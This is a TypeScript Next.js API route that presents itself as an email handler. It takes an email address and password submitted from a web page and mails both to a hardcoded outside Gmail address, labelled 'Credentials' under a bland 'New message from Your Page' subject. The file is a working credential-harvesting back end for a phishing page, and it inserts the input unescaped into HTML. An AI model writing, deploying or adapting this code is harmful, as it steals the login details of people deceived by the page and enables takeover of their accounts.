// app/api/email/route.ts

import nodemailer from 'nodemailer';

export async function POST(request: Request) {
  try {
    const { email,password } = await request.json();

    if (!email || !password) {
      return new Response(
        JSON.stringify({ error: 'Missing required fields' }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'vandulinus@gmail.com',
      subject: `New message from Your Page`,
      text: "Credentials",
      html: `
             <p><strong>Email:</strong> ${email}</p>
             <p><strong>Message:</strong><br/>${password}</p>`,
    };

    await transporter.sendMail(mailOptions);

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (error: any) {
    console.error('Email API error:', error.message, error.stack);
    return new Response(
      JSON.stringify({ message: 'Error sending email', error: error.message }),
      {
        status: 500,
        headers: { 'Content-Type': 'application/json' },
      }
    );
  }
}
